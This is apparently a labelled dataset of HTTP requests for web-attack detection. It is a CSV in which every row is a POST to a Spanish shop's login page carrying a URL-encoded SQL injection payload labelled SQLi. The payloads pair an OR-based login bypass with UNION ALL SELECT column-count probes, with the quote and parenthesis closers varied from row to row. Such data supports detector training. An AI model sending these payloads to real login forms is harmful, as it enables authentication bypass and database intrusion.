,id,method,path,query,label
3530,13530,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%209081%2C%209081%2C%209081%2C%209081%2C%209081%2C%209081%2C%209081%2C%209081%2C%209081--%20,SQLi
3531,13531,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%20368%2C%20368%2C%20368%2C%20368%2C%20368%2C%20368%2C%20368%2C%20368%2C%20368%2C%20368--%20,SQLi
3532,13532,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%201415--%20,SQLi
3533,13533,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%206693%2C%206693--%20,SQLi
3534,13534,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%206619%2C%206619%2C%206619--%20,SQLi
3535,13535,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%205997%2C%205997%2C%205997%2C%205997--%20,SQLi
3536,13536,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%208282%2C%208282%2C%208282%2C%208282%2C%208282--%20,SQLi
3537,13537,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%209744%2C%209744%2C%209744%2C%209744%2C%209744%2C%209744--%20,SQLi
3538,13538,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987%2C%201987--%20,SQLi
3539,13539,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%205418%2C%205418%2C%205418%2C%205418%2C%205418%2C%205418%2C%205418%2C%205418--%20,SQLi
3540,13540,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%202710%2C%202710%2C%202710%2C%202710%2C%202710%2C%202710%2C%202710%2C%202710%2C%202710--%20,SQLi
3541,13541,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%205895%2C%205895%2C%205895%2C%205895%2C%205895%2C%205895%2C%205895%2C%205895%2C%205895%2C%205895--%20,SQLi
3542,13542,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%205501--%20,SQLi
3543,13543,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%202348%2C%202348--%20,SQLi
3544,13544,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%209311%2C%209311%2C%209311--%20,SQLi
3545,13545,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%201083%2C%201083%2C%201083%2C%201083--%20,SQLi
3546,13546,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%203504%2C%203504%2C%203504%2C%203504%2C%203504--%20,SQLi
3547,13547,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%20823%2C%20823%2C%20823%2C%20823%2C%20823%2C%20823--%20,SQLi
3548,13548,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%207044%2C%207044%2C%207044%2C%207044%2C%207044%2C%207044%2C%207044--%20,SQLi
3549,13549,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%203054%2C%203054%2C%203054%2C%203054%2C%203054%2C%203054%2C%203054%2C%203054--%20,SQLi
3550,13550,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%204501%2C%204501%2C%204501%2C%204501%2C%204501%2C%204501%2C%204501%2C%204501%2C%204501--%20,SQLi
3551,13551,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20UNION%20ALL%20SELECT%209273%2C%209273%2C%209273%2C%209273%2C%209273%2C%209273%2C%209273%2C%209273%2C%209273%2C%209273--%20,SQLi
3552,13552,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%208478--%20,SQLi
3553,13553,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%203124%2C%203124--%20,SQLi
3554,13554,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%208329%2C%208329%2C%208329--%20,SQLi
3555,13555,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%202320%2C%202320%2C%202320%2C%202320--%20,SQLi
3556,13556,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%208811%2C%208811%2C%208811%2C%208811%2C%208811--%20,SQLi
3557,13557,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%201228%2C%201228%2C%201228%2C%201228%2C%201228%2C%201228--%20,SQLi
3558,13558,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%202260%2C%202260%2C%202260%2C%202260%2C%202260%2C%202260%2C%202260--%20,SQLi
3559,13559,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%202960%2C%202960%2C%202960%2C%202960%2C%202960%2C%202960%2C%202960%2C%202960--%20,SQLi
3560,13560,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%202629%2C%202629%2C%202629%2C%202629%2C%202629%2C%202629%2C%202629%2C%202629%2C%202629--%20,SQLi
3561,13561,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%201400%2C%201400%2C%201400%2C%201400%2C%201400%2C%201400%2C%201400%2C%201400%2C%201400%2C%201400--%20,SQLi
3562,13562,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%204726--%20%20AND%20%283931%3D3931,SQLi
3563,13563,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%20768%2C%20768--%20%20AND%20%284653%3D4653,SQLi
3564,13564,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%205769%2C%205769%2C%205769--%20%20AND%20%288781%3D8781,SQLi
3565,13565,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%206319%2C%206319%2C%206319%2C%206319--%20%20AND%20%286427%3D6427,SQLi
3566,13566,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%20468%2C%20468%2C%20468%2C%20468%2C%20468--%20%20AND%20%282630%3D2630,SQLi
3567,13567,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%206262%2C%206262%2C%206262%2C%206262%2C%206262%2C%206262--%20%20AND%20%281531%3D1531,SQLi
3568,13568,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%207021%2C%207021%2C%207021%2C%207021%2C%207021%2C%207021%2C%207021--%20%20AND%20%285157%3D5157,SQLi
3569,13569,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%201874%2C%201874%2C%201874%2C%201874%2C%201874%2C%201874%2C%201874%2C%201874--%20%20AND%20%287622%3D7622,SQLi
3570,13570,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%203175%2C%203175%2C%203175%2C%203175%2C%203175%2C%203175%2C%203175%2C%203175%2C%203175--%20%20AND%20%289642%3D9642,SQLi
3571,13571,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%209985%2C%209985%2C%209985%2C%209985%2C%209985%2C%209985%2C%209985%2C%209985%2C%209985%2C%209985--%20%20AND%20%289232%3D9232,SQLi
3572,13572,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%205647--%20%20AND%20%28%283963%3D3963,SQLi
3573,13573,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%207482%2C%207482--%20%20AND%20%28%286964%3D6964,SQLi
3574,13574,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%201496%2C%201496%2C%201496--%20%20AND%20%28%287047%3D7047,SQLi
3575,13575,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%209894%2C%209894%2C%209894%2C%209894--%20%20AND%20%28%283382%3D3382,SQLi
3576,13576,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%20279%2C%20279%2C%20279%2C%20279%2C%20279--%20%20AND%20%28%289419%3D9419,SQLi
3577,13577,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%204838%2C%204838%2C%204838%2C%204838%2C%204838%2C%204838--%20%20AND%20%28%281704%3D1704,SQLi
3578,13578,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%201121%2C%201121%2C%201121%2C%201121%2C%201121%2C%201121%2C%201121--%20%20AND%20%28%289148%3D9148,SQLi
3579,13579,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%202242%2C%202242%2C%202242%2C%202242%2C%202242%2C%202242%2C%202242%2C%202242--%20%20AND%20%28%289870%3D9870,SQLi
3580,13580,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%202614%2C%202614%2C%202614%2C%202614%2C%202614%2C%202614%2C%202614%2C%202614%2C%202614--%20%20AND%20%28%283054%3D3054,SQLi
3581,13581,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%204157%2C%204157%2C%204157%2C%204157%2C%204157%2C%204157%2C%204157%2C%204157%2C%204157%2C%204157--%20%20AND%20%28%28573%3D573,SQLi
3582,13582,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%206519--%20%20AND%20%28%28%28756%3D756,SQLi
3583,13583,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%20956%2C%20956--%20%20AND%20%28%28%283461%3D3461,SQLi
3584,13584,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%207082%2C%207082%2C%207082--%20%20AND%20%28%28%284758%3D4758,SQLi
3585,13585,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%206104%2C%206104%2C%206104%2C%206104--%20%20AND%20%28%28%28647%3D647,SQLi
3586,13586,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%201158%2C%201158%2C%201158%2C%201158%2C%201158--%20%20AND%20%28%28%287840%3D7840,SQLi
3587,13587,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%20436%2C%20436%2C%20436%2C%20436%2C%20436%2C%20436--%20%20AND%20%28%28%288120%3D8120,SQLi
3588,13588,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%204214%2C%204214%2C%204214%2C%204214%2C%204214%2C%204214%2C%204214--%20%20AND%20%28%28%282395%3D2395,SQLi
3589,13589,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%206869%2C%206869%2C%206869%2C%206869%2C%206869%2C%206869%2C%206869%2C%206869--%20%20AND%20%28%28%2866%3D66,SQLi
3590,13590,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%20858%2C%20858%2C%20858%2C%20858%2C%20858%2C%20858%2C%20858%2C%20858%2C%20858--%20%20AND%20%28%28%28132%3D132,SQLi
3591,13591,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%207650%2C%207650%2C%207650%2C%207650%2C%207650%2C%207650%2C%207650%2C%207650%2C%207650%2C%207650--%20%20AND%20%28%28%284664%3D4664,SQLi
3592,13592,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%204009--%20,SQLi
3593,13593,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%202631%2C%202631--%20,SQLi
3594,13594,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%20332%2C%20332%2C%20332--%20,SQLi
3595,13595,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%209646%2C%209646%2C%209646%2C%209646--%20,SQLi
3596,13596,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%209331%2C%209331%2C%209331%2C%209331%2C%209331--%20,SQLi
3597,13597,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%201321%2C%201321%2C%201321%2C%201321%2C%201321%2C%201321--%20,SQLi
3598,13598,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%203541%2C%203541%2C%203541%2C%203541%2C%203541%2C%203541%2C%203541--%20,SQLi
3599,13599,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%207711%2C%207711%2C%207711%2C%207711%2C%207711%2C%207711%2C%207711%2C%207711--%20,SQLi
3600,13600,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%203012%2C%203012%2C%203012%2C%203012%2C%203012%2C%203012%2C%203012%2C%203012%2C%203012--%20,SQLi
3601,13601,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%20110%2C%20110%2C%20110%2C%20110%2C%20110%2C%20110%2C%20110%2C%20110%2C%20110%2C%20110--%20,SQLi
3602,13602,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%204242--%20%20AND%20%28%27NnaW%27%3D%27NnaW,SQLi
3603,13603,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%203511%2C%203511--%20%20AND%20%28%27Fiua%27%3D%27Fiua,SQLi
3604,13604,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%206364%2C%206364%2C%206364--%20%20AND%20%28%27yDYI%27%3D%27yDYI,SQLi
3605,13605,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%201370%2C%201370%2C%201370%2C%201370--%20%20AND%20%28%27RaKT%27%3D%27RaKT,SQLi
3606,13606,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%20461%2C%20461%2C%20461%2C%20461%2C%20461--%20%20AND%20%28%27GeZK%27%3D%27GeZK,SQLi
3607,13607,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%206816%2C%206816%2C%206816%2C%206816%2C%206816%2C%206816--%20%20AND%20%28%27VpHD%27%3D%27VpHD,SQLi
3608,13608,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%208453%2C%208453%2C%208453%2C%208453%2C%208453%2C%208453%2C%208453--%20%20AND%20%28%27OvuH%27%3D%27OvuH,SQLi
3609,13609,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%205948%2C%205948%2C%205948%2C%205948%2C%205948%2C%205948%2C%205948%2C%205948--%20%20AND%20%28%27GDUG%27%3D%27GDUG,SQLi
3610,13610,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%208719%2C%208719%2C%208719%2C%208719%2C%208719%2C%208719%2C%208719%2C%208719%2C%208719--%20%20AND%20%28%27CLgn%27%3D%27CLgn,SQLi
3611,13611,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%20132%2C%20132%2C%20132%2C%20132%2C%20132%2C%20132%2C%20132%2C%20132%2C%20132%2C%20132--%20%20AND%20%28%27LAqn%27%3D%27LAqn,SQLi
3612,13612,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%202506--%20%20AND%20%28%28%27akNJ%27%3D%27akNJ,SQLi
3613,13613,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%204398%2C%204398--%20%20AND%20%28%28%27njeM%27%3D%27njeM,SQLi
3614,13614,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%20940%2C%20940%2C%20940--%20%20AND%20%28%28%27lsGy%27%3D%27lsGy,SQLi
3615,13615,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%207497%2C%207497%2C%207497%2C%207497--%20%20AND%20%28%28%27kDPO%27%3D%27kDPO,SQLi
3616,13616,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%206375%2C%206375%2C%206375%2C%206375%2C%206375--%20%20AND%20%28%28%27ZsPA%27%3D%27ZsPA,SQLi
3617,13617,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%205016%2C%205016%2C%205016%2C%205016%2C%205016%2C%205016--%20%20AND%20%28%28%27vjtP%27%3D%27vjtP,SQLi
3618,13618,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%207021%2C%207021%2C%207021%2C%207021%2C%207021%2C%207021%2C%207021--%20%20AND%20%28%28%27RxXX%27%3D%27RxXX,SQLi
3619,13619,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838%2C%201838--%20%20AND%20%28%28%27YfDm%27%3D%27YfDm,SQLi
3620,13620,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%204072%2C%204072%2C%204072%2C%204072%2C%204072%2C%204072%2C%204072%2C%204072%2C%204072--%20%20AND%20%28%28%27TFhf%27%3D%27TFhf,SQLi
3621,13621,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20UNION%20ALL%20SELECT%202548%2C%202548%2C%202548%2C%202548%2C%202548%2C%202548%2C%202548%2C%202548%2C%202548%2C%202548--%20%20AND%20%28%28%27hMkY%27%3D%27hMkY,SQLi
3622,13622,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20UNION%20ALL%20SELECT%207157--%20%20AND%20%28%28%28%27ZXsg%27%3D%27ZXsg,SQLi
3623,13623,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20UNION%20ALL%20SELECT%204939%2C%204939--%20%20AND%20%28%28%28%27ilpy%27%3D%27ilpy,SQLi
3624,13624,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20UNION%20ALL%20SELECT%206499%2C%206499%2C%206499--%20%20AND%20%28%28%28%27eqKd%27%3D%27eqKd,SQLi
3625,13625,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20UNION%20ALL%20SELECT%202846%2C%202846%2C%202846%2C%202846--%20%20AND%20%28%28%28%27anKC%27%3D%27anKC,SQLi
3626,13626,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20UNION%20ALL%20SELECT%205578%2C%205578%2C%205578%2C%205578%2C%205578--%20%20AND%20%28%28%28%27KQzd%27%3D%27KQzd,SQLi
3627,13627,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20UNION%20ALL%20SELECT%209263%2C%209263%2C%209263%2C%209263%2C%209263%2C%209263--%20%20AND%20%28%28%28%27xYgc%27%3D%27xYgc,SQLi
3628,13628,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20UNION%20ALL%20SELECT%203268%2C%203268%2C%203268%2C%203268%2C%203268%2C%203268%2C%203268--%20%20AND%20%28%28%28%27ICnu%27%3D%27ICnu,SQLi
